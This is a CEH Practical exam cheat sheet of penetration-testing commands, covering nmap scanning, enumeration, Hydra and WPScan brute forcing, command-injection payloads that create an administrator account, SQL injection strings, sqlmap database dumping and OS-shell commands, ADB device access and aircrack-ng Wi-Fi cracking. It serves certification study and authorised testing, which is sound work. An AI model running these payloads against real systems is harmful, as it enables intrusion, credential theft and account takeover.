# CEH Practical Notes

## Scanning Networks
> **Note**: Always run `sudo su` to operate as root.

- **Nmap scan for alive/active hosts**:
  ```bash
  nmap -A 192.189.19.0/24
  # or
  nmap -T4 -A <ip>
  ```
- **Zenmap/Nmap TCP scan**:
  - Target: `<ip>` (e.g., `10.10.10.16`)
  - Command:
    ```bash
    nmap -sT -v 10.10.10.16
    ```
- **Nmap scan if firewall/IDS is enabled (half-open SYN scan)**:
  ```bash
  nmap -sS -v 10.10.10.16
  ```
  - If the above fails, use fragment packets:
    ```bash
    nmap -f 10.10.10.16
    ```
- **Aggressive scan (-A)**: Includes OS detection (`-O`), version detection (`-sV`), script scanning (`-sC`), and traceroute (`--traceroute`).
- **Identify target OS using TTL and TCP window sizes (Wireshark)**:
  - Check ICMP packet’s Time to Live (TTL):
    - TTL 128: Windows
    - TTL 64: Linux
    - TTL 254: Solaris
- **Nmap scan for host discovery or OS**:
  ```bash
  nmap -O 192.168.92.10
  # or
  nmap -A 192.168.92.10
  ```
- **Windows-specific OS discovery**:
  ```bash
  nmap --script smb-os-discovery.nse 192.168.12.22
  ```
  - Script checks OS, computer name, domain, workgroup, time over SMB (ports 445 or 139).
- **Source port manipulation**:
  ```bash
  nmap -g 80 10.10.10.10
  ```

## Enumeration
- **NetBIOS enumeration (Windows CMD)**:
  ```bash
  nbtstat -a 10.10.10.10
  ```
  - `-a`: Displays NetBIOS name table.
- **NetBIOS enumeration (Nmap)**:
  ```bash
  nmap -sV -v --script nbstat.nse 10.10.10.16
  ```
- **SNMP enumeration**:
  ```bash
  nmap -sU -p 161 10.10.10.10
  # Check if port 161 (SNMP) is open
  snmp-check 10.10.10.10
  ```
  - `snmp-check` (Parrot OS): Shows user accounts, processes, etc.
- **DNS reconnaissance/enumeration**:
  ```bash
  dnsrecon -d www.google.com -z
  ```
- **FTP enumeration**:
  ```bash
  nmap -p 21 -A 10.10.10.10
  ```
- **NetBIOS enumeration (enum4linux)**:
  ```bash
  enum4linux -u martin -p apple -n 10.10.10.10  # All info
  enum4linux -u martin -p apple -P 10.10.10.10  # Policy info
  ```

## Steganography
- **Hide data using whitespace steganography (Snow)**:
  ```bash
  snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt
  ```
  - `magic`: Password
  - Stores secret in `readme2.txt` with `readme.txt` content.
- **Display hidden data**:
  ```bash
  snow -C -p "magic" readme2.txt
  ```
- **Image steganography (OpenStego)**:
  - Practice required (specific commands TBD).

## Sniffing
- **Password sniffing (Wireshark)**:
  - In a `.pcap` file, apply filter:
    ```plaintext
    http.request.method==POST
    ```
  - To capture passwords:
    - Go to **Edit** > **Find Packet**.
    - Set **Display filter** to "string", **Packet details**, and **Narrow UTF-8 & ASCII**.
    - Search for "pwd".

## Hacking Web Servers
- **Footprinting web server (Netcat/Telnet)**:
  ```bash
  nc -vv www.movies.com 80
  GET / HTTP/1.0
  # or
  telnet www.movies.com 80
  GET / HTTP/1.0
  ```
- **Enumerate web server info (Nmap)**:
  ```bash
  nmap -sV --script=http-enum www.movies.com
  ```
- **Crack FTP credentials**:
  ```bash
  nmap -p 21 10.10.10.10  # Check if port 21 is open
  ftp 10.10.10.10         # Check if credentials are needed
  ```
  - Use Hydra with wordlists:
    ```bash
    hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
    # or
    hydra -l user -P passlist.txt ftp://10.10.10.10
    ```

## Hacking Web Applications
- **Scan with OWASP ZAP (Parrot)**:
  ```bash
  zaproxy
  ```
  - In the GUI, enter the target URL and click **Automated Scan**.
- **Directory brute-forcing (Gobuster)**:
  ```bash
  gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
  ```
- **Enumerate WordPress (WPScan & Metasploit)**:
  ```bash
  wpscan --url http://10.10.10.10:8080/NEW --enumerate u
  ```
  - In Metasploit:
    ```bash
    msfconsole
    use auxiliary/scanner/http/wordpress_login_enum
    show options
    set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
    set RHOSTS 10.10.10.10
    set RPORT 8080
    set TARGETURI http://10.10.10.10:8080/
    set USERNAME admin
    run
    ```
- **Brute force with WPScan**:
  ```bash
  wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt
  # or
  wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt --passwords passwdlist.txt
  ```
- **Command injection**:
  ```bash
  | net user                    # Find users
  | dir C:\                   # Directory listing
  | net user Test /add        # Add a user
  | net user Test             # Check user
  | net localgroup Administrators Test /add  # Elevate to admin
  | net user Test             # Verify admin status
  ```
  - Use RDP with the created `Test` account.

## SQL Injections
- **Authentication bypass**:
  ```sql
  hi' OR 1=1 --
  ```
- **Insert new details**:
  ```sql
  blah';insert into login values('john','apple123');--
  ```
- **Exploit blind SQL injection**:
  - In browser console:
    ```javascript
    document.cookie
    ```
  - Copy cookie value, then:
    ```bash
    sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value]" --dbs
    ```
- **Check database tables**:
  ```bash
  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value]" -D databasename --tables
  ```
- **Dump table data**:
  ```bash
  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value]" -D databasename -T Table_Name --dump
  ```
- **Get OS shell**:
  ```bash
  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value]" --os-shell
  ```
  - In the shell:
    ```bash
    TASKLIST          # View tasks
    systeminfo        # Windows OS version
    uname -a          # Linux OS version
    ```

## Android Hacking
- **Scan for ADB port**:
  ```bash
  nmap -sV -p 5555 <ip>
  ```
- **Connect to ADB**:
  ```bash
  adb connect <ip>:5555
  ```
- **Access device shell**:
  ```bash
  adb shell
  pwd
  ls
  cd sdcard
  ls
  cat secret.txt
  # If not found, try:
  cd downloads
  ls
  ```

## Wireshark
- **Filters**:
  ```plaintext
  tcp.flags.syn == 1 and tcp.flags.ack == 0  # Count machines
  tcp.flags.syn == 1                         # Identify DoS source
  http.request.method == POST                # Capture passwords
  ```
  - Alternative: **Tools** > **Credentials** for passwords.
  - For machine count: **Statistics** > **IPv4 Addresses** > **Source and Destination**, then apply filter.

## Find FQDN
- **Nmap for LDAP (port 389)**:
  ```bash
  nmap -p389 -sV -iL <target_list>
  # or
  nmap -p389 -sV <target_ip>
  ```

## Cracking Wi-Fi Networks
- **Crack WEP**:
  ```bash
  aircrack-ng <pcap_file>
  ```
- **Crack WPA2**:
  ```bash
  aircrack-ng -a2 -b <Target_BSSID> -w <password_wordlist.txt> <WPA2_pcap_file>
  ```

## Miscellaneous Checks
- **Check RDP enabled**:
  ```bash
  nmap -p 3389 -iL ip.txt | grep open
  ```
  - `ip.txt`: List of alive hosts from target subnet.
- **Check MySQL service**:
  ```bash
  nmap -p 3306 -iL ip.txt | grep open
  ```
  - `ip.txt`: List of alive hosts from target subnet.

_Last updated: April 2025_